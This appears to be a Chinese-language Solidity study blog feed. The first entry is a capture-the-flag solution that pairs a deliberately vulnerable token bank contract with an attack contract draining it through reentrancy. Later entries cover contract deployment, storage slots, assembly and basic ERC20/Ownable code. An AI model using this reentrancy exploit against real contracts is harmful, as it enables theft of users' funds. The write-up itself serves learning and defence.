class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">interface ITokenReceiver &#123;</span><br><span class="line">    function <span class="title function_">tokenFallback</span><span class="params">(address from, uint256 value, bytes data)</span> external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleERC223Token &#123;</span><br><span class="line">    <span class="comment">// Track how many tokens are owned by each address.</span></span><br><span class="line">    mapping (address =&gt; uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span> public name = <span class="string">&quot;Simple ERC223 Token&quot;</span>;</span><br><span class="line">    <span class="built_in">string</span> public symbol = <span class="string">&quot;SET&quot;</span>;</span><br><span class="line">    uint8 public decimals = <span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply = <span class="number">1000000</span> * (uint256(<span class="number">10</span>) ** decimals);</span><br><span class="line"></span><br><span class="line">    event <span class="title function_">Transfer</span><span class="params">(address indexed from, address indexed to, uint256 value)</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">SimpleERC223Token</span><span class="params">()</span> public &#123;</span><br><span class="line">        balanceOf[msg.sender] = totalSupply;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(address(<span class="number">0</span>), msg.sender, totalSupply)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">isContract</span><span class="params">(address _addr)</span> private view <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span> is_contract)</span> &#123;</span><br><span class="line">        uint length;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            <span class="comment">//retrieve the size of the code on target address, this needs assembly</span></span><br><span class="line">            length := extcodesize(_addr)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> length &gt; <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">transfer</span><span class="params">(address to, uint256 value)</span> public <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span> success)</span> &#123;</span><br><span class="line">        bytes memory empty;</span><br><span class="line">        <span class="keyword">return</span> transfer(to, value, empty);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">transfer</span><span class="params">(address to, uint256 value, bytes data)</span> public <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= value);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(msg.sender, to, value)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isContract(to)) &#123;</span><br><span class="line">            ITokenReceiver(to).tokenFallback(msg.sender, value, data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event <span class="title function_">Approval</span><span class="params">(address indexed owner, address indexed spender, uint256 value)</span>;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">approve</span><span class="params">(address spender, uint256 value)</span></span><br><span class="line">        public</span><br><span class="line">        <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span> success)</span></span><br><span class="line">    &#123;</span><br><span class="line">        allowance[msg.sender][spender] = value;</span><br><span class="line">        emit <span class="title function_">Approval</span><span class="params">(msg.sender, spender, value)</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">transferFrom</span><span class="params">(address from, address to, uint256 value)</span></span><br><span class="line">        public</span><br><span class="line">        <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span> success)</span></span><br><span class="line">    &#123;</span><br><span class="line">        require(value &lt;= balanceOf[from]);</span><br><span class="line">        require(value &lt;= allowance[from][msg.sender]);</span><br><span class="line"></span><br><span class="line">        balanceOf[from] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line">        allowance[from][msg.sender] -= value;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(from, to, value)</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TokenBankChallenge &#123;</span><br><span class="line">    SimpleERC223Token public token;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">TokenBankChallenge</span><span class="params">(address player)</span> public &#123;</span><br><span class="line">        token = new SimpleERC223Token();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Divide up the 1,000,000 tokens, which are all initially assigned to</span></span><br><span class="line">        <span class="comment">// the token contract&#x27;s creator (this contract).</span></span><br><span class="line">        balanceOf[msg.sender] = <span class="number">500000</span> * <span class="number">10</span>**<span class="number">18</span>;  <span class="comment">// half for me</span></span><br><span class="line">        balanceOf[player] = <span class="number">500000</span> * <span class="number">10</span>**<span class="number">18</span>;      <span class="comment">// half for you</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">isComplete</span><span class="params">()</span> public view <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> token.balanceOf(this) == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">tokenFallback</span><span class="params">(address from, uint256 value, bytes)</span> public &#123;</span><br><span class="line">        require(msg.sender == address(token));</span><br><span class="line">        require(balanceOf[from] + value &gt;= balanceOf[from]);</span><br><span class="line">        balanceOf[from] += value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">withdraw</span><span class="params">(uint256 amount)</span> public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= amount);</span><br><span class="line"></span><br><span class="line">        require(token.transfer(msg.sender, amount));<span class="comment">//漏洞：先转了钱后修改了变量，重大漏洞</span></span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attcak&#123;</span><br><span class="line">    uint public count;</span><br><span class="line">    TokenBankChallenge public token;</span><br><span class="line">    function <span class="title function_">g</span><span class="params">(address addr)</span>public&#123;</span><br><span class="line">        token=TokenBankChallenge(addr);</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">tokenFallback</span><span class="params">(address from,uint256 value,bytes)</span>public&#123;</span><br><span class="line">        <span class="keyword">if</span>(count==<span class="number">0</span>)&#123;</span><br><span class="line">        count++;<span class="comment">//要在token.withdraw(value);前面，否则永远无法停止，直到outofgas</span></span><br><span class="line">        token.withdraw(value);</span><br><span class="line">        </span><br><span class="line">    &#125;&#125;</span><br><span class="line">    function <span class="title function_">attack</span><span class="params">(uint value)</span>public&#123;</span><br><span class="line">        token.withdraw(value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//本题就是利用重入漏洞，切记先减钱在转账，否则容易被重入,多注意合约中可以调用外部的函数，如tokenFallback;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -solidity学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MarkDown语法</title>
      <link href="/2023/02/25/MarkDown%E8%AF%AD%E6%B3%95/MarkDown/"/>
      <url>/2023/02/25/MarkDown%E8%AF%AD%E6%B3%95/MarkDown/</url>
      
        <content type="html"><![CDATA[<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><p>官网链接<a href="https://markdown.com.cn/basic-syntax/">MarkDown</a><br><img src="/1.jpg" alt="Alt text"><br><img src="https://s2.loli.net/2023/02/25/bjveJFwNkVSXcRi.jpg" alt="PantherChameleon_ZH-CN2554514270_1920x1080.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> -MarkDown语法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>solidity知识点总结（四）</title>
      <link href="/2022/12/30/solidity/%E6%9D%82%E4%B9%B1/%EF%BC%88%E5%9B%9B%EF%BC%89solidity%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2022/12/30/solidity/%E6%9D%82%E4%B9%B1/%EF%BC%88%E5%9B%9B%EF%BC%89solidity%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="部署合约"><a href="#部署合约" class="headerlink" title="部署合约"></a>部署合约</h1><h2 id="通过内联汇编部署合约-懵点"><a href="#通过内联汇编部署合约-懵点" class="headerlink" title="通过内联汇编部署合约(懵点)"></a>通过内联汇编部署合约(懵点)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">contract TextContract1&#123;</span><br><span class="line">    address public owner=msg.sender;</span><br><span class="line">    function <span class="title function_">setOwner</span><span class="params">(address _owner)</span>public&#123;</span><br><span class="line">        require(msg.sender==owner,<span class="string">&quot;not owner&quot;</span>);</span><br><span class="line">        owner=_owner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TestContract2&#123;</span><br><span class="line">    address public owner=msg.sender;</span><br><span class="line">    uint public value=msg.value;</span><br><span class="line">    uint public x;</span><br><span class="line">    uint public y;</span><br><span class="line">    constructor(uint _x,uint _y)&#123;</span><br><span class="line">        x=_x;</span><br><span class="line">        y=_y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//代理合约，用来部署合约1和2</span></span><br><span class="line">contract Proxy&#123;</span><br><span class="line">    event <span class="title function_">Deploy</span><span class="params">(address)</span>;</span><br><span class="line">    function <span class="title function_">deploy</span><span class="params">(bytes memory _code)</span>external payable <span class="title function_">returns</span><span class="params">(address addr)</span>&#123;<span class="comment">//隐式返回：returns后面定义了名称，自动返回</span></span><br><span class="line">        <span class="comment">//获得部署合约的地址</span></span><br><span class="line">        assembly&#123;<span class="comment">//内联汇编</span></span><br><span class="line">            <span class="comment">//create(v,p,n)</span></span><br><span class="line">            <span class="comment">//v代表部署合约发送的币的数量  通过callvalue获取</span></span><br><span class="line">            <span class="comment">//p代表内存中机器码开始的位置  通过add(_code,0x20)跳跃</span></span><br><span class="line">            <span class="comment">//n代表机器码内存的大小  通过mload(_code)获取</span></span><br><span class="line">            addr :=create(callvalue(),add(_code,<span class="number">0x20</span>),mload(_code))<span class="comment">//msg.value在这里不行</span></span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">        require(addr!=address(<span class="number">0</span>),<span class="string">&quot;deploy failed&quot;</span>); <span class="comment">//判断是否部署成功</span></span><br><span class="line">        emit <span class="title function_">Deploy</span><span class="params">(addr)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//通过date来呼叫另一个合约中的函数</span></span><br><span class="line">    function <span class="title function_">execute</span><span class="params">(address _target,bytes memory _date)</span>external payable&#123;</span><br><span class="line">        (<span class="type">bool</span> success, )=_target.call&#123;value:msg.value&#125;(_date);</span><br><span class="line">        require(success,<span class="string">&quot;failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//助手合约，用来得到合约1和2或者合约中函数的code</span></span><br><span class="line">contract Helper&#123;</span><br><span class="line">    <span class="comment">//获取呼叫合约1的代码</span></span><br><span class="line">    function <span class="title function_">getBytecode1</span><span class="params">()</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">        bytes memory bytecode=type(TestContract1).creationCode;<span class="comment">//特定方法type(合约名称).creationCode</span></span><br><span class="line">        <span class="keyword">return</span> bytecode;</span><br><span class="line">        没有构造函数时用此方法获得bytecode;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取呼叫合约2的代码</span></span><br><span class="line">    function <span class="title function_">getBytecode2</span><span class="params">(uint _x,uint _y)</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">        bytes memory bytecode=type(TestContract2).creationCode;<span class="comment">//特定方法</span></span><br><span class="line">        <span class="keyword">return</span> abi.encodePacked(bytecode,abi.encode(_x,_y)); <span class="comment">//通过将传入的参数与bytecode打包生成新的bytecode</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取呼叫合约1中setOwner的所需要的date</span></span><br><span class="line">    function <span class="title function_">getCalldate</span><span class="params">(address _owner)</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;<span class="comment">//_owner为传入合约1中函数的参数</span></span><br><span class="line">        <span class="keyword">return</span> abi.encodeWithSignature(<span class="string">&quot;setOwner(address)&quot;</span>,_owner);<span class="comment">//特定方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="用create2来构造函数（可提前预测生成的地址）"><a href="#用create2来构造函数（可提前预测生成的地址）" class="headerlink" title="用create2来构造函数（可提前预测生成的地址）"></a>用create2来构造函数（可提前预测生成的地址）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line">contract DeployWithCreate2&#123;</span><br><span class="line">  address public owner;</span><br><span class="line">  constructor(address _owner)&#123;</span><br><span class="line">    owner=_owner;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Create2Factory&#123;</span><br><span class="line">  event <span class="title function_">Deploy</span><span class="params">(address addr)</span>;</span><br><span class="line">  function <span class="title function_">deploy</span><span class="params">(uint _salt)</span>external&#123;</span><br><span class="line">    DeployWithCreate2 _contract=new DeployWithCreate2&#123;</span><br><span class="line">      salt:bytes32(_salt)</span><br><span class="line">    &#125;(msg.sender);<span class="comment">//create2方法相对于原来的方法只需加个大括号</span></span><br><span class="line">    emit <span class="title function_">Deploy</span><span class="params">(address(_contract))</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//计算合约地址的方法</span></span><br><span class="line">  function <span class="title function_">getAddress</span><span class="params">(bytes memory bytecode,uint _salt)</span>public view <span class="title function_">returns</span><span class="params">(address)</span></span><br><span class="line">  &#123;</span><br><span class="line">    bytes32 hash=keccak256(abi.encodePacked(</span><br><span class="line">      bytes1(<span class="number">0xff</span>),address(this),_salt,keccak256(bytecode)</span><br><span class="line">    ));</span><br><span class="line">    <span class="keyword">return</span> address(uint160(uint(hash)));</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//计算bytecode</span></span><br><span class="line">  function <span class="title function_">getBytecode</span><span class="params">(address _owner)</span>public pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">    bytes memory bytecode=type(DeployWithCreate2).creationCode;</span><br><span class="line">    <span class="keyword">return</span> abi.encodePacked(bytecode,abi.encode(_owner));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="寻找slot"><a href="#寻找slot" class="headerlink" title="寻找slot"></a>寻找slot</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line">contract A&#123;</span><br><span class="line">    bytes32 public a;</span><br><span class="line">    bytes32 public b;</span><br><span class="line">    bytes32 public c;</span><br><span class="line">    uint public n;</span><br><span class="line">    uint public g=<span class="number">100</span> ether;</span><br><span class="line">    uint public f=<span class="number">2</span>**<span class="number">256</span><span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//keccak256(bytes32(1))!=keccak256(abi.encodePacked(bytes32(1)))</span></span><br><span class="line">    function <span class="title function_">Mapping</span><span class="params">(address _salt,uint num)</span>external <span class="title function_">returns</span><span class="params">(bytes32)</span>&#123;<span class="comment">//_salt=1</span></span><br><span class="line">        a=keccak256(abi.encodePacked(bytes32(uint(uint160(_salt))),bytes32(num)));</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">UInt</span><span class="params">(uint num)</span>external <span class="title function_">returns</span><span class="params">(bytes32 )</span>&#123;</span><br><span class="line">        b=keccak256(abi.encodePacked(bytes32(num)));</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">     function <span class="title function_">ToBytes</span><span class="params">(uint _a)</span>external <span class="title function_">returns</span><span class="params">(bytes32)</span>&#123;</span><br><span class="line">         c=bytes32(_a);</span><br><span class="line">         <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">find</span><span class="params">()</span>external <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        n=<span class="number">2</span>**<span class="number">256</span><span class="number">-1</span>-uint(b)+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="solidity汇编"><a href="#solidity汇编" class="headerlink" title="solidity汇编"></a>solidity汇编</h1><h2 id="Memory-layout"><a href="#Memory-layout" class="headerlink" title="Memory layout"></a>Memory layout</h2><ul><li>内存地址：以字节为单位：storage layout :256位一个slot</li><li>0x00-0x3f:保留：0x10:16 0x20:32 0x30:48 0x40:64  &#x2F;&#x2F;相当于演草纸（keccak时会用来保留数据)</li><li>0x40-0x5f: 32个自由内存指针（初始指向0x80-0x9f然后依次向下移动指向下一位）</li><li>0x60-0x7f: zero slot&#x2F;&#x2F; 没啥用</li><li>0x80-0x9f:自由指针指向以及以后的地址都是自由指针指向的地址</li></ul><h2 id="内存操作相关的汇编"><a href="#内存操作相关的汇编" class="headerlink" title="内存操作相关的汇编"></a>内存操作相关的汇编</h2><ul><li>Mload（offset字节）： 将内存（memory）数据（32字节）载入stack(头部)</li><li>Mstore(offset,value): 把(memory)里的数组设置为value  语法 ：mstore(0,value)</li><li>Sload(slotindex)：语法result :&#x3D; sload(number.slot) 寻找对应slot的值,并将result放在堆栈中  </li><li>Sstore(slotindex,value):  语法sstore(number.slot,value)  设置对映slot的值</li><li>return (offset,length):(0,32)  返回内存（memory）中的数据</li></ul><h2 id="联系"><a href="#联系" class="headerlink" title="联系"></a>联系</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line">interface Itest&#123;</span><br><span class="line">    function <span class="title function_">readData</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>;<span class="comment">//可查返回值，偷偷返回了</span></span><br><span class="line">&#125;</span><br><span class="line">contract test&#123;</span><br><span class="line">    uint256 number;</span><br><span class="line">    function <span class="title function_">store</span><span class="params">(uint num)</span>public&#123;</span><br><span class="line">        assembly&#123;</span><br><span class="line">            sstore(number.slot,num)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">read</span><span class="params">()</span>public view <span class="title function_">returns</span><span class="params">(uint256)</span>&#123;</span><br><span class="line">        assembly&#123;</span><br><span class="line">            let result:=sload(number.slot)<span class="comment">//所有局部变量都在堆栈上面（result在堆栈上）</span></span><br><span class="line"></span><br><span class="line">            mstore(<span class="number">0</span>,result)<span class="comment">//因为return要返回内存中的数据，result在堆栈上，所以将它储存到内存中</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span>(<span class="number">0</span>,<span class="number">32</span>)<span class="comment">//返回的是对应slot中32的长度的数据，0表示对应slot，32代表返回数据长度</span></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function readData()public view returns(uint256)&#123;<span class="comment">//如果没有returns仍可以返回，但需要一个返回接口如上面的接口</span></span><br><span class="line">        assembly&#123;</span><br><span class="line">            let result:=sload(number.slot)</span><br><span class="line">            let free_pointer:=mload(<span class="number">0x40</span>)<span class="comment">//将自由指针指向40这个位置</span></span><br><span class="line">            mstore(free_pointer,result)<span class="comment">//改变值</span></span><br><span class="line">            <span class="keyword">return</span>(free_pointer,<span class="number">32</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -solidity学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>solidity基础合约</title>
      <link href="/2022/12/27/solidity/%E6%9D%82%E4%B9%B1/solidity%E5%9F%BA%E7%A1%80%E5%90%88%E7%BA%A6/"/>
      <url>/2022/12/27/solidity/%E6%9D%82%E4%B9%B1/solidity%E5%9F%BA%E7%A1%80%E5%90%88%E7%BA%A6/</url>
      
        <content type="html"><![CDATA[<h2 id="Ownable"><a href="#Ownable" class="headerlink" title="Ownable"></a>Ownable</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: GPL-3.0</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.7</span>;</span><br><span class="line"></span><br><span class="line">contract Ownable &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    </span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier <span class="title function_">onlyOwner</span><span class="params">()</span> &#123;  </span><br><span class="line">        require(msg.sender == owner, <span class="string">&quot;not owner&quot;</span>);</span><br><span class="line">        _; <span class="comment">//函数中其他的代码在</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">////函数中其他的代码在下划线这个位置运行</span></span><br><span class="line">    function <span class="title function_">setOwner</span><span class="params">(address _newOwner)</span> external onlyOwner &#123;　　<span class="comment">//切换合约管理员</span></span><br><span class="line">        require(_newOwner != address(<span class="number">0</span>), <span class="string">&quot;invalid address&quot;</span>); <span class="comment">//确认是否是0地址</span></span><br><span class="line">        owner = _newOwner;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20"></a>ERC20</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.15</span>;</span><br><span class="line"></span><br><span class="line"> interface IERC20 &#123;</span><br><span class="line">    function <span class="title function_">totalSupply</span><span class="params">()</span> external view <span class="title function_">returns</span><span class="params">(uint)</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">balanceOf</span><span class="params">(address account)</span> external view <span class="title function_">returns</span><span class="params">(uint)</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">transfer</span><span class="params">(address recipient, uint amount)</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>;</span><br><span 